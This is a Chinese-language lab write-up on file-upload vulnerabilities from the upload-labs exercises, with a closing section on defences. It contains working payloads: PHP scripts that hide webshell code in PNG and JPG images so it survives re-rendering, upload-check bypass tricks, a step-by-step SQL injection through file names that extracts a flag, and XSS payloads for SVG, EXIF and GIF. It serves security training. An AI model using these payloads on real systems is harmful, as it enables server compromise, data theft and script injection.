![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwMzRhZmU2LWFiMjQtMS5wbmc?x-oss-process=image/format,png)

我们将代码写到该位置.  


![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwNDYyZWQ4LWFiMjQtMS5wbmc?x-oss-process=image/format,png)

上传后在下载到本地使用16进制编辑器打开  


![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwNTliYjA2LWFiMjQtMS5wbmc?x-oss-process=image/format,png)

可以看到php代码没有被去除.成功上传图片马
{% endtab %}

{% tab title="PNG" %}
png的二次渲染的绕过并不能像gif那样简单.

#### png文件组成 <a id="toc-4"></a>

png图片由3个以上的数据块组成.

PNG定义了两种类型的数据块，一种是称为关键数据块\(critical chunk\)，这是标准的数据块，另一种叫做辅助数据块\(ancillary chunks\)，这是可选的数据块。关键数据块定义了3个标准数据块\(IHDR,IDAT, IEND\)，每个PNG文件都必须包含它们.

数据块结构

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwNjVjMjM0LWFiMjQtMS5wbmc?x-oss-process=image/format,png)

CRC\(cyclic redundancy check\)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：

x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1

#### 分析数据块 <a id="toc-5"></a>

IHDR

数据块IHDR\(header chunk\)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。

文件头数据块由13字节组成，它的格式如下图所示。

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwNzQ4MDU4LWFiMjQtMS5wbmc?x-oss-process=image/format,png)

PLTE

调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。

IDAT

图像数据块IDAT\(image data chunk\)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。

IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像

IEND

图像结束数据IEND\(image trailer chunk\)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。

如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：

00 00 00 00 49 45 4E 44 AE 42 60 82

#### 写入php代码 <a id="toc-6"></a>

在网上找到了两种方式来制作绕过二次渲染的png木马.

写入PLTE数据块

php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.

这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.`03`为索引彩色图像.

1. 在PLTE数据块写入php代码. 
2. 计算PLTE数据块的CRC  CRC脚本

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwODQ3MDYyLWFiMjQtMS5wbmc?x-oss-process=image/format,png)

```python
import binascii
import re
 
png = open(r'2.png','rb')
a = png.read()
png.close()
hexstr = binascii.b2a_hex(a)
 
''' PLTE crc '''
data =  '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0]
crc = binascii.crc32(data[:-16].decode('hex')) & 0xffffffff
print hex(crc)
```

运行结果

```text
526579b0
```

3.修改CRC值

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwOTQ4YmZhLWFiMjQtMS5wbmc?x-oss-process=image/format,png)

4.验证  
 将修改后的png图片上传后,下载到本地打开  


![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwYTM5ZTJlLWFiMjQtMS5wbmc?x-oss-process=image/format,png)

写入IDAT数据块

这里有国外大牛写的脚本,直接拿来运行即可.

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
 
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
 
imagepng($img,'./1.png');
?>
```

运行后得到1.png.上传后下载到本地打开如下图
{% endtab %}

{% tab title="JPG" %}
这里也采用国外大牛编写的脚本jpg\_payload.php.

```php
<?php
    /*
    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.
    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>
    In case of successful injection you will get a specially crafted image, which should be uploaded again.
    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
    Sergey Bobrov @Black2Fan.
    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
    */
 
    $miniPayload = "<?=phpinfo();?>";
 
 
    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
 
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }
 
    set_error_handler("custom_error_handler");
 
    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;
 
        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }
 
        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');
 
    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }
 
    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }
 
    class DataInputStream {
        private $binData;
        private $order;
        private $size;
 
        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }
 
        public function seek() {
            return ($this->size - strlen($this->binData));
        }
 
        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }
 
        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }
 
        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }
 
        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

使用方法

#### 准备 <a id="toc-8"></a>

随便找一个jpg图片,先上传至服务器然后再下载到本地保存为`1.jpg`.

#### 插入php代码 <a id="toc-9"></a>

使用脚本处理`1.jpg`,命令`php jpg_payload.php 1.jpg`  
  
 使用16进制编辑器打开,就可以看到插入的php代码.  


![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU2LTMwYzg2MGIwLWFiMjQtMS5wbmc?x-oss-process=image/format,png)

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU1LTMwYmI0MjM2LWFiMjQtMS5wbmc?x-oss-process=image/format,png)

#### 上传图片马 <a id="toc-10"></a>

将生成的`payload_1.jpg`上传.  


![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU2LTMwZDNhMWEwLWFiMjQtMS5wbmc?x-oss-process=image/format,png)

#### 验证 <a id="toc-11"></a>

将上传的图片再次下载到本地,使用16进制编辑器打开  


![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly94emZpbGUuYWxpeXVuY3MuY29tL21lZGlhL3VwbG9hZC9waWN0dXJlLzIwMTgwODI5MDg0MDU2LTMwZTE3YjY4LWFiMjQtMS5wbmc?x-oss-process=image/format,png)

可以看到,php代码没有被去除.  
证明我们成功上传了含有php代码的图片.

需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.
{% endtab %}
{% endtabs %}



### pass-18-条件竞争

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

先上传再判断，所以实在判断前就对上传的文件进行请求

![1.php](../../.gitbook/assets/image%20%28665%29.png)

![2.php](../../.gitbook/assets/image%20%28664%29.png)



### pass-19-图片

```php
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};

```

验证过程：依次检查文件是否存在、文件名是否可写、检查后缀（白名单）、检查文件大小、检查临时文件存在、保存到临时目录里、然后再重命名。与Pass-18存在同样的条件竞争。不同的是这里先检查了后缀，所以要上传符合白名单里的才能进行。

### pass-20-点号

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

 同样是上传路径可控，可以使用和Pass-13同样的方式绕过。不同的是这里的黑名单，可以文件名称保存的时候，加上`.`，最末的`.`号使得`pathinfo()`获取到的`PATHINFO_EXTENSION`为空，从而绕过黑名单。

![](../../.gitbook/assets/image%20%28668%29.png)

### pass-21-数组

```php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}

```

验证过程：先检查MIME，通过后检查文件名，保存名称为空的就用上传的文件名。再判断文件名是否是array数组，不是的话就用explode\(\)函数通过.号分割成数组。然后获取最后一个，也就是后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。

```php
explode(string $delimiter , string $string [, int $limit])
//返回由字符串组成的数组，每个元素都是string的一个子串，它们被字符串delimiter作为边界点分割出来 
reset(array &$array)
//将数组的内部指针指向第一个单元
```

绕过过程：绕过MIMIE，改一下包的Content-Type，为了绕过explode\(\)函数，需要传入数组，绕过白名单，由于取的是end\(\)也就是数组最后一个，需要传入数组的最后一个为jpg\|png\|gif，最后是拼接文件名，取的是reset\(\)第一个，即索引为0，和索引count\(\)-1（数组内元素个数-1）。所以令索引0为1.php，索引2为jpg（只要是索引1之后都可），这样数组元素个数为2，拼接的就是索引0和索引1，也就是1.php和空，结果还是1.php，这样就可以使得拼接后的文件名为1.php。

![](../../.gitbook/assets/image%20%28661%29.png)

## 三、文件上传对应防御手段

1. 黑白名单；
2. 对上传的文件重命名，不易被猜测；
3. 对上传的内容进行读取检查；
4. 不要暴露上传文件的位置；
5. 禁用上传文件的执行权限；

**系统运行时的防御**

1、文件上传的目录设置为不可执行。只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响。

2、判断文件类型。在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。

3、使用随机数改写文件名和文件路径。文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。

4、单独设置文件服务器的域名。由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。

5、使用安全设备防御。文件上传攻击的本质就是将恶意文件或者脚本上传到服务器，专业的安全设备防御此类漏洞主要是通过对漏洞的上传利用行为和恶意文件的上传过程进行检测。恶意文件千变万化，隐藏手法也不断推陈出新，对普通的系统管理员来说可以通过部署安全设备来帮助防御。

**系统开发阶段的防御**

对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。

**系统维护阶段的防御**

1、系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。

2、定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。

3、对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自身的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。

##  四、相关内容

### 1、[文件名SQL注入](https://www.cnblogs.com/conquer-vv/p/11328249.html)

#### 通关过程：

{% tabs %}
{% tab title="通关过程" %}
步骤如下：

```text
# 1 
filename="'+(selselectect hex(database()))+'.jpg" 
7765625 →十六转字符串→ web 

# 2
filename="'+(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg"
131277325825392 →十转十六→ 7765625f7570 →十六转字符串→ web_up

# 3
filename="'+(selselectect conv(substr(hex(database()),13,25),16,10))+ '.jpg"
1819238756 →十转十六→ 6c6f6164 →十六转字符串→ load

# 4
数据库名：web_upload

# 5
filename="'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),1,12),16,10))+'.jpg"
114784820031327 →十转十六→ 68656c6c6f5f →十六转字符串→ hello_

# 6
filename="'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),13,12),16,10))+'.jpg"
112615676665705 →十转十六→ 666c61675f69 →十六转字符串→ flag_i
 
 # 7
filename="'+(selselectect+conv(substr(hex((selselectect table_name frfromom information_schema.tables where table_schema='web_upload' limit 1,1)),25,12),16,10))+'.jpg"
126853610566245 →十转十六→ 735f68657265 →十六转字符串→ s_here
 
 # 8
 表名：hello_flag_is_here
 
 # 9
 filename="'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg"
 115858377367398 →十转十六→ 695f616d5f66 →十六转字符串→ i_am_f
 
 filename="'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),13,12),16,10))+'.jpg"
 7102823 →十转十六→ 6c6167 →十六转字符串→ lag
 # 10
 filename="'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg"
 36427215695199 →十转十六→ 21215f406d5f →十六转字符串→ !!_@m_
 
 # 11
 filename="'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),7,12),16,10))+'.jpg"
 92806431727430 →十转十六→ 54682e655f46 →十六转字符串→ Th.e_F
 # 12
 filename="'+(selselectect+CONV(substr(hex((seselectlect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg"
 560750951 →十转十六→ 216c6167 →十六转字符串→ !lag
 
 # 13
 FLAG：!!_@m_Th.e_F!lag
```
{% endtab %}

{% tab title="涉及知识点" %}
1、SQL注入双写绕过

2、语句拆解

```text
'+(selselectect+CONV(substr(hex(database()),1,12),16,10))+'

# 数据流程：
hex(database())    #将获取到的数据转换为16进制，设为a
substr(a,1,12)     #将a中的数据取从第一位开始，取12个字符。设为b
CONV(b,16,10)      #将b中的数据由16进制转为10进制
```

3、前后闭合  
4、"+"号代替空格号。
{% endtab %}
{% endtabs %}

### 2、[文件上传与XSS](https://www.freebuf.com/articles/web/101843.html)

#### 1\) 文件名

文件名本身可能就是网页的一部分可以造成反射，所以可以通过将 XSS 语句插入文件名中来触发反射。

![](https://image.3001.net/images/20160415/14606935726900.gif)

#### 2\) 元数据

使用 exiftool 工具可以修改 EXIF 元数据，从而在某些地方造成反射：

```text
$ exiftool -FIELD=XSS FILE
```

例子：

```text
$ exiftool -Artist=’ “><img src=1 onerror=alert(document.domain)>’ brute.jpeg
```

![](../../.gitbook/assets/image%20%28671%29.png)

#### 3\) 内容

如果 Web 应用允许上传 SVG（一种图像类型）扩展名，则以下内容可以用来触发 XSS：

```text
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

一个 POC 可以在这里看到 [brutelogic.com.br/poc.svg](http://brutelogic.com.br/poc.svg)。

#### 4）源码

我们可以很容易的创建一张包含 javascript payload 的 GIF 图片，然后将这张图片当做源码加以引用。如果我们可以成功的注入相同的域名，如下所示，则这样可以有效的帮我们绕过 CSP（内容安全策略）防护（其不允许执行例如`<script>alert(1)</script>`）

![xss](https://image.3001.net/images/20160415/1460693586372.gif!small)

创建这样一张图片可以使用如下内容并将文件命名为 .gif 后缀：

```text
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
```

GIF 文件标识 GIF89a 做为一个 javascript 的变量分配给 alert 函数。中间注释部分的 XSS 是为了以防图像被检索为 text/HTML MIME 类型时，通过请求文件来执行 payload。

我们通过下图可以发现，类 UNIX 命令的 PHP 函数 exif\_imagetype\(\) 和 getimagesize\(\) 都会将这个文件识别为 GIF 文件。而一般的 Web 应用都是使用这些函数来验证图像类型的，所以这样一个文件是可以被上传的（但上传后可能会被杀毒软件查杀）。

![4.png](https://image.3001.net/images/20160415/14606935917753.png!small)



### 3、[bypass安全狗](https://www.freebuf.com/articles/web/247720.html)

 方法：

1. 文件名中添加`;` 例如：1;23.php
2. 文件名中添加`'` 例如：1'23.php
3. 文件后缀中添加空格：`12.php` 
4. 文件后缀中添加空格：`12.p hp`





